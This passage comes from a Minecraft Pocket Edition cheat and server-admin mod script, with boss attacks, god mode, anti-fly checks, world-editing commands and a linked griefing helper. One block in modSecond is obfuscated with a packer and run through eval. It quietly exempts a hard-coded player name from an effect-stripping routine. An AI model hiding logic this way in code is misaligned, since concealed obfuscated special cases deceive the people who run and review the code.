Level.dropItem(h.x, h.y, h.z, 1, 266, 7, 0);
if(h.l) h.m("잊지 않겠다, "+Player.getName(Player.getEntity())+"...");
else h.m("I will remember you, "+Player.getName(Player.getEntity())+"...");
h.t = 0;
}
}
if(h.t==101){
var rrr = Math.floor(Math.random()*4);
if(rrr==0) Entity.setPosition(Player.getEntity(), Entity.getX(h.hero), Entity.getY(h.hero)+1, Entity.getZ(h.hero));
if(rrr==1) Entity.setPosition(h.hero, Player.getX(), Player.getY()+1, Player.getZ());
}
if(h.t==1){
h.t = 201;
h.r = Math.floor(Math.random()*15);
if(h.r==0){
if(h.l) h.m("날 부른 이유가 무엇인가...");
else h.m("Why did you called me...");
}
if(h.r==1){
h.x = Entity.getX(h.hero);
h.y = Entity.getY(h.hero);
h.z = Entity.getZ(h.hero);
explode(h.x+4, h.y, h.z+4, 2);
explode(h.x+4, h.y, h.z-4, 2);
explode(h.x-4, h.y, h.z+4, 2);
explode(h.x-4, h.y, h.z-4, 2);
}
if(h.r==2){
h.x = Entity.getX(h.hero);
h.y = Entity.getY(h.hero);
h.z = Entity.getZ(h.hero);
Level.spawnMob(h.x, h.y+2, h.z, 33);
Level.spawnMob(h.x, h.y+2, h.z, 33);
Level.spawnMob(h.x, h.y+2, h.z, 33);
if(h.l) h.m("터지는거 좋아하니?");
else h.m("Do you like explosion?");
}
if(h.r==3){
Entity.setFireTicks(Player.getEntity(), 5);
}
if(h.r==4){
Entity.setHealth(Player.getEntity(), Entity.getHealth(Player.getEntity())-6);
}
if(h.r==5){
Entity.setVelY(Player.getEntity(), 1.3);
}
if(h.r==6){
h.x = Entity.getX(h.hero);
h.y = Entity.getY(h.hero);
h.z = Entity.getZ(h.hero);
yaw = Math.floor(Entity.getYaw(h.hero));
h.s = -Math.sin(yaw/180*Math.PI);
h.c = Math.cos(yaw/180*Math.PI);
setTile(h.x+3*h.s, h.y, h.z+3*h.c, 46);
}
if(h.r==7){
if(h.l) h.m("메테오!!");
else h.m("Meteor!!");
Level.spawnMob(h.x-8, h.y+6, h.z, 65);
Level.spawnMob(h.x, h.y+10, h.z+3, 65);
Level.spawnMob(h.x+4, h.y+7, h.z, 65);
Level.spawnMob(h.x, h.y+14, h.z-5, 65);
Level.spawnMob(h.x-9, h.y+8, h.z, 65);
Level.spawnMob(h.x+6, h.y+13, h.z+3, 65);
Level.spawnMob(h.x-2, h.y+15, h.z-7, 65);
}
if(h.r==8){
h.x = Entity.getX(h.hero);
h.y = Entity.getY(h.hero);
h.z = Entity.getZ(h.hero);
yaw = Math.floor(Entity.getYaw(h.hero));
h.s = -Math.sin(yaw/180*Math.PI);
h.c = Math.cos(yaw/180*Math.PI);
for(var gun=3;gun<30;gun++){
setTile(h.x+gun*h.s, h.y, h.z+gun*h.c, 51);
setTile(h.x+gun*h.s+1, h.y, h.z+gun*h.c+1, 51);
}
}
if(h.r==9){
h.x = Player.getX();
h.y = Player.getY()-1;
h.z = Player.getZ();
for(var xx=h.x-1;xx<h.x+2;xx++)
for(var zz=h.z-1;zz<h.z+2;zz++)
setTile(xx, h.y, zz, 30);
}
if(h.r==10){
h.x = Entity.getX(h.hero);
h.y = Entity.getY(h.hero);
h.z = Entity.getZ(h.hero);
for(var n=0;n<10;n++)
Level.spawnMob(h.x, h.y+2, h.z, 32);
}
if(h.r==11){
h.x = Entity.getX(h.hero);
h.y = Entity.getY(h.hero);
h.z = Entity.getZ(h.hero);
Level.spawnMob(h.x, h.y+4, h.z, 41);
}
if(h.r==12){
if(h.l) h.m("이 화살들은 뭐지..?")
else h.m("What are these arrows..?");
}
if(h.r==13){
Entity.addEffect(Player.getEntity(), MobEffect.confusion, 200, 2, true, false);
}
if(h.r==14){
Entity.addEffect(Player.getEntity(), MobEffect.poison, 200, 2, true, false);
}
}
if(h.r==6){
if(h.t==196){
setTile(h.x+3*h.s+1, h.y, h.z+3*h.c, 46);
}
if(h.t==191){
setTile(h.x+3*h.s-1, h.y, h.z+3*h.c, 46);
}
if(h.t==186){
setTile(h.x+3*h.s, h.y, h.z+3*h.c+1, 46);
}
if(h.t==181){
setTile(h.x+3*h.s, h.y+1, h.z+3*h.c, 46);
}
if(h.t==176){
setTile(h.x+3*h.s, h.y+1, h.z+3*h.c, 0);
Level.spawnMob(Math.floor(h.x+3*h.s)+0.5, h.y+1.6, Math.floor(h.z+3*h.c)+0.5, 65);
}
}
if(h.t>101&&h.r==12){
h.x = Entity.getX(h.hero);
h.y = Entity.getY(h.hero);
h.z = Entity.getZ(h.hero);
yaw = Math.floor(Entity.getYaw(h.hero));
h.s = -Math.sin(yaw/180*Math.PI);
h.c = Math.cos(yaw/180*Math.PI);
var arr = Level.spawnMob(h.x+2*h.s, h.y+1, h.z+2*h.c, 80);
Entity.setVelX(arr, 1.3*h.s);
Entity.setVelY(arr, 0.8);
Entity.setVelZ(arr, 1.3*h.c);
}

for(var n in esp.c){
if(esp.c[n]>0)
esp.c[n]--;
}
if(esp.c[2]>150){
esp.d3x = Entity.getX(ad);
esp.d3y = Entity.getY(ad)-2;
esp.d3z = Entity.getZ(ad);
for(var xx=esp.d3x-1;xx<esp.d3x+2;xx++)
for(var zz=esp.d3z-1;zz<esp.d3z+2;zz++)
if(getTile(xx, esp.d3y, zz)==0||getTile(xx, esp.d3y, zz)==8||getTile(xx, esp.d3y, zz)==9||getTile(xx, esp.d3y, zz)==51){
setTile(xx, esp.d3y, zz, 17, 1);
}
}
if(esp.c[2]==150){
esp.c2 = -1;
}
if(esp.c2==-1){
esp.d3x = Entity.getX(ad);
esp.d3y = Entity.getY(ad)-4;
esp.d3z = Entity.getZ(ad);
if(getTile(esp.d3x, esp.d3y-1, esp.d3z)!=0){
for(var xx=esp.d3x-1;xx<esp.d3x+2;xx++)
for(var zz=esp.d3z-1;zz<esp.d3z+2;zz++)
if(getTile(xx, esp.d3y+2, zz)==0){
setTile(xx, esp.d3y+2, zz, 30);
esp.c2 = 16;
}
}
}
if(esp.c2>0){
esp.c2--;
}
if(esp.c2==1){
for(var xx=esp.d3x-1;xx<esp.d3x+2;xx++)
for(var zz=esp.d3z-1;zz<esp.d3z+2;zz++)
if(getTile(xx, esp.d3y+2, zz)==30){
setTile(xx, esp.d3y+2, zz, 0);
}
}
if(esp.c[3]==1795){
for(var yy=esp.dy+5;yy<esp.dy+9;yy++){
setTile(esp.dx+7, yy, esp.dz+7, 173);
setTile(esp.dx+7, yy, esp.dz, 173);
setTile(esp.dx+7, yy, esp.dz-7, 173);
setTile(esp.dx, yy, esp.dz+7, 173);
setTile(esp.dx, yy, esp.dz-7, 173);
setTile(esp.dx-7, yy, esp.dz+7, 173);
setTile(esp.dx-7, yy, esp.dz, 173);
setTile(esp.dx-7, yy, esp.dz-7, 173);
}
}
if(esp.c[3]==1790){
for(var yy=esp.dy+1;yy<esp.dy+9;yy++){
setTile(esp.dx+7, yy, esp.dz+7, 89);
setTile(esp.dx+7, yy, esp.dz, 89);
setTile(esp.dx+7, yy, esp.dz-7, 89);
setTile(esp.dx, yy, esp.dz+7, 89);
setTile(esp.dx, yy, esp.dz-7, 89);
setTile(esp.dx-7, yy, esp.dz+7, 89);
setTile(esp.dx-7, yy, esp.dz, 89);
setTile(esp.dx-7, yy, esp.dz-7, 89);
}
var p2x, p2y, p2z;
for each(var e in Entity.getAll()){
p2x = Math.abs(Player.getX()-Entity.getX(e));
p2y = Math.abs(Player.getY()-Entity.getY(e));
p2z = Math.abs(Player.getZ()-Entity.getZ(e));
if(p2x<=30&&p2y<=30&&p2z<=30&&ad!=e){
teleport(e, Entity.getX(e), Entity.getY(e)+13, Entity.getZ(e));
Entity.setHealth(e, Entity.getHealth(e)-6);
if(mcpev&&Entity.getEntityTypeId(e)<64) Entity.addEffect(e, MobEffect.wither, 200, 2, true, false);
}
}
}
if(esp.c[3]==1780){
for(var yy=esp.dy+1;yy<esp.dy+9;yy++){
setTile(esp.dx+7, yy, esp.dz+7, 0);
setTile(esp.dx+7, yy, esp.dz, 0);
setTile(esp.dx+7, yy, esp.dz-7, 0);
setTile(esp.dx, yy, esp.dz+7, 0);
setTile(esp.dx, yy, esp.dz-7, 0);
setTile(esp.dx-7, yy, esp.dz+7, 0);
setTile(esp.dx-7, yy, esp.dz, 0);
setTile(esp.dx-7, yy, esp.dz-7, 0);
}
}
if(esp.tf){
ModPE.showTipMessage("\n\n\n              기본기 "+Math.floor((esp.c[0]+14)/15)+"초, 스킬1 "+Math.floor((esp.c[1]+14)/15)+"초, 스킬2 "+Math.floor((esp.c[2]+14)/15)+"초, 궁극기 "+Math.floor((esp.c[3]+14)/15)+"초");
}
if(f.tf){
for(var n=0;n<f.pp.length;n++){
if(ad!=f.pp[n]&&Player.isPlayer(f.pp[n])){
if(getTile(Math.round(Entity.getX(f.pp[n])-0.5), Math.floor(Entity.getY(f.pp[n])-4), Math.round(Entity.getX(f.pp[n])-0.5))==0) f.n[n]++;
else f.n[n] = 0;
if(f.n[n]>10){
Dark.toast(Player.getName(f.pp[n])+"(이)가 공중부양을 시도하였습니다.");
f.x = Math.round(Entity.getX(f.pp[n])-0.5);
f.y = Math.floor(Entity.getY(f.pp[n]));
f.z = Math.round(Entity.getZ(f.pp[n])-0.5);
for(var m=0;m<100;m++){
if(getTile(f.x, f.y-m, f.z)!=0){
f.y -= m;
break;
}
}
teleport(f.pp[n], f.x, f.y+1.5, f.z);
f.n[n] = 0;
}
}
else if(!Player.isPlayer(f.pp[n])){
f.pp.splice(n, 1);
f.n.splice(n, 1);
}
}
}
if(timeLock)
Level.setTime(tlv);
if(jump){
if(Entity.getVelY(Player.getEntity())>0.12&&j2==false){
Entity.setVelY(Player.getEntity(), 0.6);
j2 = true;
}
else if(Entity.getVelY(Player.getEntity())<0){
j2 = false;
}
}
if(gh[1]){
Player.setHealth(20);
}
if(gh[5]){
var yaw2 = Math.floor(getYaw());
var pitch2 = Math.floor(getPitch());
Entity.setRot(Player.getEntity(), yaw2+3, pitch2);
}
if(gh[7]){
var block = getTile(Player.getX(), Player.getY()-2, Player.getZ());
if(block==8||block==9||block==10||block==11){
Entity.setVelY(Player.getEntity(), 0.00001);
}
}
if(loadChest2){
if(loadChestCount==loadChest3){
showChestList();
loadChest = false;
loadChest2 = false;
}
loadChest3 = loadChestCount;
}
if(showEntHealth&&Entity.getHealth(showEntHealthTarget)>0){
Entity.setNameTag(showEntHealthTarget, "health : "+Entity.getHealth(showEntHealthTarget));
}
if(clock2!=null){
ctx.runOnUiThread(new java.lang.Runnable({
run:function(){
clockSeek.setProgress(Level.getTime());
}
}));
}
if(mst>0){
mst--;
}
if(mst==0){
mst = 20;
modSecond(true);
}
if(autoTorch){
var p2x, p2y, p2z;
p2x = Math.round(Player.getX()-0.5);
p2y = Player.getY();
p2z = Math.round(Player.getZ()-0.5);
var bb = getTile(p2x, p2y-2, p2z);
if(Level.getBrightness(p2x, p2y, p2z)<5){
if(getTile(p2x, p2y-1, p2z)==0&&bb!=0&&bb!=8&&bb!=9&&bb!=10&&bb!=11)
setTile(p2x, p2y-1, p2z, 50);
}

}
var file = new java.io.File(sdcard+"/darkTornado/terrorHelper/link2.txt");
if(file.exists()){
Dark.showDialog("스크립트 연동 알림", "스크립트 \"테러 도우미\"로부터 연동 신청이 들어왔습니다. 이제부터는 \"테러 도우미\"를 실행하시면, Dark Cheater의 테러 도우미 대신 연동된 테러 도우미가 실행됩니다.");
Dark.save("linkT", true);
file.delete();
}
var file = new java.io.File(sdcard+"/darkTornado/darkCheater/cwepLinkAlert.txt");
if(file.exists()){
Dark.showDialog("스크립트 연동 알림", "스크립트 \"Dark Cheater Addon - Client World Edit Plus\"로부터 연동 신청이 들어왔습니다. 이제부터 \"지형 수정\"의 \"서버원용 월드에딧 GUI\"를 사용하실 수 있습니다.");
file.delete();
}
var file = new java.io.File(sdcard+"/darkTornado/darkCheater/seedLinkAlert.txt");
if(file.exists()){
Dark.showDialog("스크립트 연동 알림", "스크립트 \"Dark Cheater Addon - The Seed\"로부터 연동 신청이 들어왔습니다. 이제부터 \"서버 관련\"의 \"The Seed\"를 사용하실 수 있습니다.");
file.delete();
}
if(dou.seek){
dou.seek2++;
}
if(antiMine[0]!=null){
for(var n in antiMine){
if(Player.isPlayer(antiMine[n]))
Entity.addEffect(antiMine[n], MobEffect.digSlowdown, 10, 9, true, false);
}
}
if(miniMap!=null&&miniMapTime==1){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
var mapData = createMiniMap();
var back = new android.graphics.drawable.BitmapDrawable(mapData);
back.setAlpha(miniMapSet.alpha);
miniMapData.setBackgroundDrawable(back);
}
catch(e){
Dark.showError(e);
}
}
}));
miniMapTime = 11;
}
if(miniMapTime>0){
miniMapTime--;
}
if(showPlayerHealth){
for(var n=0;n<pls.length;n++){
var pp = pls[n];
if(Player.isPlayer(pp)){
var pn = Player.getName(pp).split(" (");
Entity.setNameTag(pp, pn[0]+" ("+Entity.getHealth(pp)+")");
}
}
}
for(var n=0;n<pls.length;n++){
if(!Player.isPlayer(pls[n])){
serverLog += "[서버 접속 해제] 닉네임 : "+pls2[n]+", 시간 : "+Dark.getTime()+"\n";
if(hyperLogOn) hyperLog += "["+Dark.getTime(2)+"] "+pls2[n]+"(이)가 서버에서 나감\n";
pls.splice(n, 1);
pls2.splice(n, 1);
}
}
for(var n in antiMove){
if(Player.isPlayer(antiMove[n])){
Entity.addEffect(antiMove[n], MobEffect.movementSlowdown, 20, 99, true, false);
Entity.addEffect(antiMove[n], MobEffect.jump, 20, -99, true, false);
}
}
if(invenSave){
if(Entity.getHealth(ad)>0){
if(isDied){
for(var n=0;n<36;n++)
Player.setInventorySlot(n, invenSaveData[n][0], invenSaveData[n][1], invenSaveData[n][2]);
for(var n=0;n<4;n++)
Player.setArmorSlot(n, armorSaveData[n][0], armorSaveData[n][1]);
Dark.toast("인벤토리가 복구되었습니다.");
isDied = false;
}
else if(!isDied){
for(var n=0;n<36;n++)
invenSaveData[n] = [Player.getInventorySlot(n), Player.getInventorySlotCount(n), Player.getInventorySlotData(n)];
for(var n=0;n<4;n++)
armorSaveData[n] = [Player.getArmorSlot(n), Player.getArmorSlotDamage(n)];
}
}
else if(Entity.getHealth(ad)<=0){
isDied = true;
}
}
if(searchTarget!=null){
if(Entity.getHealth(searchTarget)<=0){
darkMessage("추적하던 엔티티가 사라졌습니다.");
searchTarget = null;
}
else{
ModPE.showTipMessage("\n\n엔티티 추적 : "+searchTargetData+"\n  거리 : "+(Math.floor(getDistanceFromAdmin(Entity.getX(searchTarget), Entity.getY(searchTarget), Entity.getZ(searchTarget))*100)/100));
}
}
if(maxHealthFix){
var plsa = ScriptManager.allplayers;
for(var n=0;n<plsa.size();n++){
var eh = Entity.getHealth(plsa.get(n));
if(eh>20) Entity.setMaxHealth(plsa.get(n), eh);
else if(eh<=20) Entity.setMaxHealth(plsa.get(n), 20);
}
}
if(getPlayers){
var plsa = ScriptManager.allplayers;
for(var n=0;n<plsa.size();n++){
if(!Player.isPlayer(plsa.get(n))){
leftPls.push(plsa.get(n));
ScriptManager.callScriptMethod("entityRemovedHook", [new java.lang.Long(plsa.get(n))]);
ScriptManager.allplayers.remove(n);
}
}
}

}


function modSecond(tf){
if(tf){
if(showMobHealth){
var names = [];
var entityIds = [];
for(var n=0;entityData[n][1]<64;n++){
names[n] = entityData[n][0];
entityIds[n] = entityData[n][1];
}
var ents = ScriptManager.allentities;
for(var n=0;n<ents.size();n++){
var e = ents.get(n);
var entityId = Entity.getEntityTypeId(e);
if(entityId<64&&!Player.isPlayer(e)){
if(mcpev3) Entity.setNameTag(e, names[entityIds.indexOf(entityId)]+" ("+Entity.getHealth(e)+"/"+Entity.getMaxHealth(e)+")");
else Entity.setNameTag(e, names[entityIds.indexOf(entityId)]+" ("+Entity.getHealth(e)+")");
}
}
}
if(mobStop){
var ents = ScriptManager.allentities;
for(var n=0;n<ents.size();n++){
var e = ents.get(n);
var entityId = Entity.getEntityTypeId(e);
if(entityId<64&&!Player.isPlayer(e)){
try{
Entity.addEffect(e, MobEffect.movementSlowdown, 20, 99, true, false);
Entity.addEffect(e, MobEffect.jump, 20, -99, true, false);
}
catch(e){
//null
}
}
}
}
if(gh[6]){
var p2x, p2y, p2z;
for each(var e in Entity.getAll()){
p2x = Math.abs(Player.getX()-Entity.getX(e));
p2y = Math.abs(Player.getY()-Entity.getY(e));
p2z = Math.abs(Player.getZ()-Entity.getZ(e));
if(p2x<=9&&p2y<=9&&p2z<=9&&Player.getEntity()!=e)
Entity.setHealth(e, 0);
}
}
if(searchTarget!=null) Entity.linkWithParticle(ad, searchTarget);
var code = function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('7 5="\\b\\4\\r\\q\\8\\t \\q\\4\\8\\u\\A\\d\\4 \\g\\4\\d\\p\\i\\4\\y\\b\\b\\h\\a\\a\\4\\f\\8\\s \\g\\4\\d\\p\\i\\4\\h\\a\\a\\4\\f\\8".B(" ");9(v[w]){c(7 n=0;n<6[5[0]];n++){9(j!=6[n]&&k[5[1]](6[n])!=l){o[5[2]](6[n])}}}x{9(e[0]!=z){c(7 n=0;n<6[5[0]];n++){9(j!=6[n]&&k[5[1]](6[n])!=l){c(7 m=0;m<e[5[0]];m++){o[5[3]](6[n],e[m])}}}}}',38,38,'||||x65|_0xe15a|pls|var|x74|if|x66|x6C|for|x6D|antiPotionData|x63|x72|x45|x76|ad|Player|mnmn|||Entity|x6F|x67|x6E|x73|x68|x4E|antiTerror|15|else|x41|null|x61|split'.split('|'),0,{});
eval(code);
if(posData[0]!=null){
for(var n in posData){
teleport(posData[n][0], posData[n][1], posData[n][2], posData[n][3])
}
}
if(useMine){
new java.lang.Thread({
run : function(){
var data = Dark.mapRead("mineData").toString().split("::");
var blockIds = [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 14, 14, 14, 15, 15, 15, 15, 15, 15, 15, 16, 16, 16, 16, 16, 16, 16, 16, 16, 16, 16, 16, 16, 73, 73, 73, 21, 21, 56, 129];
for(var n=0;n<data.length;n++){
var pos = data[n].split("\\.");
for(var xx=pos[0];xx<=pos[1];xx++)
for(var yy=pos[2];yy<=pos[3];yy++)
for(var zz=pos[4];zz<=pos[5];zz++)
if(getTile(xx, yy, zz)==0){
setTile(xx, yy, zz, blockIds[Math.floor(Math.random()*100)]);
}
}
var data = Dark.mapRead("stoneMineData").toString().split("::");
for(var n=0;n<data.length;n++){
var pos = data[n].split("\\.");
for(var xx=pos[0];xx<=pos[1];xx++)
for(var yy=pos[2];yy<=pos[3];yy++)
for(var zz=pos[4];zz<=pos[5];zz++)
if(getTile(xx, yy, zz)==0){
setTile(xx, yy, zz, 1);
}
}
}
}).start();
}
if(compileFinish) eval(dcmsData.modSecond+"");
if(spawn==2){
showParticle(spawnPos[0], spawnPos[1], spawnPos[2]);
}
if(bs.tf){
for(var n=0;n<bs.pos.length;n++){
if(getTile(bs.pos[n][0], bs.pos[n][1], bs.pos[n][2])==bs.data[0]&&Level.getData(bs.pos[n][0], bs.pos[n][1], bs.pos[n][2])==bs.data[1]) Entity.linkWithParticle(Player.getEntity(), bs.pos[n], true);
else bs.pos.splice(n, 1);
}
ModPE.showTipMessage("\n"+Item.getName(bs.data[0], bs.data[1])+" ("+bs.data[0]+", "+bs.data[1]+")\n추적 결과 : "+bs.pos.length+"개");
}

}

}


function procCmd(cmd){
var Data = cmd.split(" ");
var Data2 = cmd.split("  ");
if(w.tf){
if(Data[0]=="set"&&Data[1]!="home"){
fixPosData();
if(w.back) w.backUpData = [];
setTiles(w.x[2], w.x[3], w.y[2], w.y[3], w.z[2], w.z[3], Data[1], Data[2], w.back);
if(w.uin){
Dark.toast(Item.getName(Data[1], Data[2])+"(으)로 채웠습니다.");
}
else{
if(Data[2]==undefined) Dark.toast("블록 아이디가 "+Data[1]+"인 블록으로 채워졌습니다.");
else Dark.toast("블록 아이디가 "+Data[1]+", 블록 데미지가 "+Data[2]+"인 블록으로 채워졌습니다.");
}
}
if(Data[0]=="replace"){
fixPosData();
if(w.back) w.backUpData = [];
for(var xx=w.x[2];xx<w.x[3]+1;xx++)
for(var yy=w.y[2];yy<w.y[3]+1;yy++)
for(var zz=w.z[2];zz<w.z[3]+1;zz++)
if(getTile(xx, yy, zz)==Data[1])
setTile(xx, yy, zz, Data[2], 0, w.back);
if(w.uin) Dark.toast(Item.getName(Data[1], 0)+"(을)를 "+Item.getName(Data[2], 0)+"(으)로 바꾸었습니다.");
else Dark.toast("블록 아이디가 "+Data[1]+"인 블록이 "+Data[2]+"인 블록으로 변경되었습니다.");
}
if(Data[0]=="change"){
fixPosData();
if(w.back) w.backUpData = [];
for(var xx=w.x[2];xx<w.x[3]+1;xx++)
for(var yy=w.y[2];yy<w.y[3]+1;yy++)
for(var zz=w.z[2];zz<w.z[3]+1;zz++)
if(getTile(xx, yy, zz)==Data[1]&&Level.getData(xx, yy, zz)==Data[2])
setTile(xx, yy, zz, Data[3], Data[4], w.back);
if(w.uin) Dark.toast(Item.getName(Data[1], Data[2])+"(을)를 "+Item.getName(Data[3], Data[4])+"(으)로 바꾸었습니다.");
else Dark.toast("블록 아이디가 "+Data[1]+", 블록 데미지가 "+Data[2]+"인 블록이, 블록 아이디가 "+Data[3]+", 블록 데미지가 "+Data[4]+"인 블록으로 변경되었습니다.");
}
if(cmd=="no tree"){
fixPosData();
if(w.back) w.backUpData = [];
for(var xx=w.x[2];xx<w.x[3]+1;xx++)
for(var yy=w.y[2];yy<w.y[3]+1;yy++)
for(var zz=w.z[2];zz<w.z[3]+1;zz++)
if((getTile(xx, yy, zz)==17)||(getTile(xx, yy, zz)==18)||(getTile(xx, yy, zz)==161)||(getTile(xx, yy, zz)==162))
setTile(xx, yy, zz, 0, 0, w.back);
Dark.toast("나무들이 제거되었습니다.");
}
if(cmd=="snow"){
fixPosData();
if(w.back) w.backUpData = [];
for(var xx=w.x[2];xx<w.x[3]+1;xx++)
for(var yy=w.y[3]-1;yy>=w.y[2];yy--)
for(var zz=w.z[2];zz<w.z[3]+1;zz++)
if(getTile(xx, yy, zz)!=0&&getTile(xx, yy+1, zz)==0)
setTile(xx, yy+1, zz, 78, 0, w.back);
Dark.toast("눈을 내렸습니다.");
}
if(cmd=="freeze"){
fixPosData();
if(w.back) w.backUpData = [];
for(var xx=w.x[2];xx<w.x[3]+1;xx++)
for(var yy=w.y[3]-1;yy>=w.y[2];yy--)
for(var zz=w.z[2];zz<w.z[3]+1;zz++)
if((getTile(xx, yy, zz)==8)||(getTile(xx, yy, zz)==9)) setTile(xx, yy, zz, 79, 0, w.back);
else if((getTile(xx, yy, zz)==10)||(getTile(xx, yy, zz)==11)) setTile(xx, yy, zz, 49, 0, w.back);
else if(getTile(xx, yy, zz)==51) setTile(xx, yy, zz, 0);
else if((getTile(xx, yy, zz)!=0&&getTile(xx, yy, zz)!=79)&&getTile(xx, yy+1, zz)==0) setTile(xx, yy+1, zz, 78, 0, w.back);
Dark.toast("얼렸습니다.");
}
if(Data[0]=="pillar"){
if(Data[1]=="off"){
w.p2 = false;
Dark.toast("비활성화 되었습니다.");
}
else{
w.p1 = Number(Data[1]);
Dark.toast(Data[1]+"칸으로 설정되었습니다.");
w.p2 = true;
}
}
if(cmd=="no water"){
fixPosData();
if(w.back) w.backUpData = [];
for(var xx=w.x[2];xx<w.x[3]+1;xx++)
for(var yy=w.y[2];yy<w.y[3]+1;yy++)
for(var zz=w.z[2];zz<w.z[3]+1;zz++)
if((getTile(xx, yy, zz)==8)||(getTile(xx, yy, zz)==9))
setTile(xx, yy, zz, 0, 0, w.back);
Dark.toast("물이 제거되었습니다.");
}
if(Data[0]=="wall"){
fixPosData();
if(w.back) w.backUpData = [];
setTiles(w.x[2], w.x[3], w.y[2], w.y[3], w.z[2], w.z[3], Data[1], Data[2], w.back);
setTiles(w.x[2]+1, w.x[3]-1, w.y[2], w.y[3], w.z[2]+1, w.z[3]-1, 0);
if(w.uin){
Dark.toast(Item.getName(Data[1], Data[2])+"(으)로 벽을 생성했습니다.");
}
else{
if(Data[2]==undefined) Dark.toast("블록 아이디가 "+Data[1]+"인 블록으로 벽을 생성했습니다.");
else Dark.toast("블록 아이디가 "+Data[1]+", 블록 데미지가 "+Data[2]+"인 블록으로 벽을 생성했습니다.");
}
}
if(Data[0]=="wall2"){
fixPosData();
if(w.back) w.backUpData = [];
for(var yy=w.y[2];yy<w.y[3]+1;yy++){
for(var xx=w.x[2];xx<w.x[3]+1;xx++){
setTile(xx, yy, w.z[2], Data[1], Data[2], w.back);
setTile(xx, yy, w.z[3], Data[1], Data[2], w.back);
}
for(var zz=w.z[2];zz<w.z[3]+1;zz++){
setTile(w.x[2], yy, zz, Data[1], Data[2], w.back);
setTile(w.x[3], yy, zz, Data[1], Data[2], w.back);
}
}
if(w.uin){
Dark.toast(Item.getName(Data[1], Data[2])+"(으)로 벽을 생성했습니다.");
}
else{
if(Data[2]==undefined) Dark.toast("블록 아이디가 "+Data[1]+"인 블록으로 벽을 생성했습니다.");
else Dark.toast("블록 아이디가 "+Data[1]+", 블록 데미지가 "+Data[2]+"인 블록으로 벽을 생성했습니다.");
}
}
if(cmd=="copy"){
fixPosData();
var n = 0, m = 0, o = 0;
var nn = 0;
w.b = [];
w.bd = [];
for(var xx=w.x[2];xx<w.x[3]+1;xx++){
w.b[n] = new Array(w.x[3]-w.x[2]);
w.bd[n] = new Array(w.x[3]-w.x[2]);
for(var yy=w.y[2];yy<w.y[3]+1;yy++){
w.b[n][m] = new Array(w.y[3]-w.y[2]);
w.bd[n][m] = new Array(w.y[3]-w.y[2]);
for(var zz=w.z[2];zz<w.z[3]+1;zz++){
w.b[n][m][o] = [];
w.bd[n][m][o] = [];
w.b[n][m][o] = getTile(xx, yy, zz);
w.bd[n][m][o] = Level.getData(xx, yy, zz);
o++;
nn++;
}
w.zz = o;
o = 0;
m++;
}
w.yy = m;
m = 0;
n++;
}
w.xx = n;
Dark.toast(nn+"개의 블록들을 복사했습니다.");
}
if(cmd=="paste"){
if(w.back) w.backUpData = [];
var nn = 0;
for(var n=0;n<w.xx;n++){
for(var m=0;m<w.yy;m++){
for(var o=0;o<w.zz;o++){
setTile(w.x[0]+n, w.y[0]+m, w.z[0]+o, w.b[n][m][o], w.bd[n][m][o], w.back);
nn++;
}}}
Dark.toast(nn+"개의 블록들을 붙여넣었습니다.");
}
if(cmd=="back"){
for(var n=0;n<w.backUpData.length;n++){
setTile(w.backUpData[n][0], w.backUpData[n][1], w.backUpData[n][2], w.backUpData[n][3], w.backUpData[n][4]);
}
Dark.toast("가장 최근에 실행했던 명령어를 되돌렸습니다.");
}
if(Data[0]=="circle"){
if(w.back) w.backUpData = [];
for(var n=-Data[1];n<Number(Data[1])+1;n++){
for(var m=-Data[1];m<Number(Data[1])+1;m++){
var cir = Math.pow(n, 2)+Math.pow(m, 2);
if(cir>=Math.pow(Number(Data[1])-1, 2)&&cir<=Math.pow(Data[1], 2)){
setTile(w.x[0]+n, w.y[0], w.z[0]+m, Data[2], Data[3], w.back);
}
}}
if(w.uin){
Dark.toast(Item.getName(Data[2], Data[3])+"(으)로 원을 생성했습니다.");
}
else{
if(Data[3]==undefined) Dark.toast("블록 아이디가 "+Data[2]+"인 블록으로 원을 생성했습니다.");
else Dark.toast("블록 아이디가 "+Data[2]+", 블록 데미지가 "+Data[3]+"인 블록으로 원을 생성했습니다.");
}
}
if(Data[0]=="circle2"){
if(w.back) w.backUpData = [];
for(var n=-Data[1];n<Number(Data[1])+1;n++){
for(var m=-Data[1];m<Number(Data[1])+1;m++){
if(Math.pow(n, 2)+Math.pow(m, 2)<=Math.pow(Data[1], 2))
setTile(w.x[0]+n, w.y[0], w.z[0]+m, Data[2], Data[3], w.back);
}}
if(w.uin){
Dark.toast(Item.getName(Data[2], Data[3])+"(으)로 내부가 차있는 원을 생성했습니다.");
}
else{
if(Data[3]==undefined) Dark.toast("블록 아이디가 "+Data[2]+"인 블록으로 내부가 차있는 원을 생성했습니다.");
else Dark.toast("블록 아이디가 "+Data[2]+", 블록 데미지가 "+Data[3]+"인 블록으로 내부가 차있는 원을 생성했습니다.");
}
}
if(Data[0]=="cylin"){
if(w.back) w.backUpData = [];
for(var n=-Data[1];n<Number(Data[1])+1;n++){
for(var m=-Data[1];m<Number(Data[1])+1;m++){
var cir = Math.pow(n, 2)+Math.pow(m, 2);
if(cir>=Math.pow(Number(Data[1])-1, 2)&&cir<=Math.pow(Data[1], 2)){
for(var o=0;o<Data[2];o++)
setTile(w.x[0]+n, w.y[0]+o, w.z[0]+m, Data[3], Data[4], w.back);
}
}}
if(w.uin){
Dark.toast(Item.getName(Data[3], Data[4])+"(으)로 내부가 원기둥을 생성했습니다.");
}
else{
if(Data[4]==undefined) Dark.toast("블록 아이디가 "+Data[3]+"인 블록으로 원기둥을 생성했습니다.");
else Dark.toast("블록 아이디가 "+Data[3]+", 블록 데미지가 "+Data[4]+"인 블록으로 원기둥을 생성했습니다.");
}
}
if(Data[0]=="sphere"){
if(w.back) w.backUpData = [];
for(var n=-Data[1];n<Number(Data[1])+1;n++){
